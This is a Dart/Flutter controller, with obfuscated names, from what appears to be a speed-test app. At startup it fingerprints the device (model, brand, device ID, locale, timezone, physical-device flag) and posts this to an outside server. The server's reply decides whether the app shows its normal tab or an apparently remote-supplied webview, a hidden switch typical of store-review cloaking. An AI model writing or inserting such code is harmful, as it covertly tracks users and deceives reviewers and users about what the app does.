import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var kdsyaj = RxBool(false);
  var pdtaseinxz = RxBool(true);
  var yodrxhq = RxString("");
  var monserrate = RxBool(false);
  var stokes = RxBool(true);
  final abverqdp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    fqwm();
  }


  Future<void> fqwm() async {

    monserrate.value = true;
    stokes.value = true;
    pdtaseinxz.value = false;

    abverqdp.post("https://soul.lanyu.website/julnmkairzxoshcyvtgfbpde",data: await mkryipd()).then((value) {
      var tkebjl = value.data["tkebjl"] as String;
      var ztgq = value.data["ztgq"] as bool;
      if (ztgq) {
        yodrxhq.value = tkebjl;
        petra();
      } else {
        lakin();
      }
    }).catchError((e) {
      pdtaseinxz.value = true;
      stokes.value = true;
      monserrate.value = false;
    });
  }

  Future<Map<String, dynamic>> mkryipd() async {
    final DeviceInfoPlugin pzurm = DeviceInfoPlugin();
    PackageInfo dxzmwt_lphn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ehjzqn = Platform.localeName;
    var oxlbtd = currentTimeZone;

    var akvcdyn = dxzmwt_lphn.packageName;
    var myak = dxzmwt_lphn.version;
    var byxhtdaz = dxzmwt_lphn.buildNumber;

    var wtbz = dxzmwt_lphn.appName;
    var xgfdsn = "";
    var zabdho  = "";
    var adaBosco = "";
    var amberGreenholt = "";
    var mlrue = "";
    var nyaStoltenberg = "";
    var lauryOlson = "";
    var nettieSchaden = "";
    var soniaHamill = "";


    var eypbhl = "";
    var gnwq = false;

    if (GetPlatform.isAndroid) {
      eypbhl = "android";
      var abpoimr = await pzurm.androidInfo;

      mlrue = abpoimr.brand;

      xgfdsn  = abpoimr.model;
      zabdho = abpoimr.id;

      gnwq = abpoimr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      eypbhl = "ios";
      var nrvisumhyx = await pzurm.iosInfo;
      mlrue = nrvisumhyx.name;
      xgfdsn = nrvisumhyx.model;

      zabdho = nrvisumhyx.identifierForVendor ?? "";
      gnwq  = nrvisumhyx.isPhysicalDevice;
    }
    var res = {
      "wtbz": wtbz,
      "byxhtdaz": byxhtdaz,
      "oxlbtd": oxlbtd,
      "myak": myak,
      "akvcdyn": akvcdyn,
      "mlrue": mlrue,
      "ehjzqn": ehjzqn,
      "zabdho": zabdho,
      "eypbhl": eypbhl,
      "gnwq": gnwq,
      "soniaHamill" : soniaHamill,
      "amberGreenholt" : amberGreenholt,
      "nettieSchaden" : nettieSchaden,
      "lauryOlson" : lauryOlson,
      "xgfdsn": xgfdsn,
      "nyaStoltenberg" : nyaStoltenberg,

    };
    return res;
  }

  Future<void> lakin() async {
    Get.offAllNamed("/speedTab");
  }

  Future<void> petra() async {
    Get.offAllNamed("/speedItem");
  }

}
